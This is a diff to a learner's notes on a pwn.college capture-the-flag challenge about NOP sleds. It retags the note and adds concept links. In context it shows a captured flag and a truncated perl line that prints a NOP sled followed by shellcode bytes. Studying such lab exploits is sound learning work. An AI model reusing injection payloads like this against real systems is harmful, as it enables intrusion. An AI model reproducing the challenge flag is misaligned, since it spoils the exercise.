@@ -4,8 +4,9 @@ Tittle: NOP Sled
 Date & Tme: 2026 - 09 - 07 10:23
 tags:
   - Challenge
-  - BinaryExploitation
-  - ShellcodeInjection
+  - Shellcode-Injection
+  - NOP-Sled
+  - ASLR-Landing
 ---
 ---
 ## FLAG : `pwn.college{MWYjEJtzjc1hdY-4I2QSIljuhu6.dhTMywiN4kDOyEzW}`
@@ -51,3 +52,7 @@ perl -e 'print "\x90"x0x800 . "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\
 ### Key Takeaways : 
 - `\x90` is NOP Sled byte,
 - NOP stands for `NO Operation`, it mean it doesn't do anything when executed
+
+---
+## Related Concepts : 
+[[Basic Shellcode]], [[NOP Sled]], [[Shellcode Database]], [[Assembly]], [[perl]]
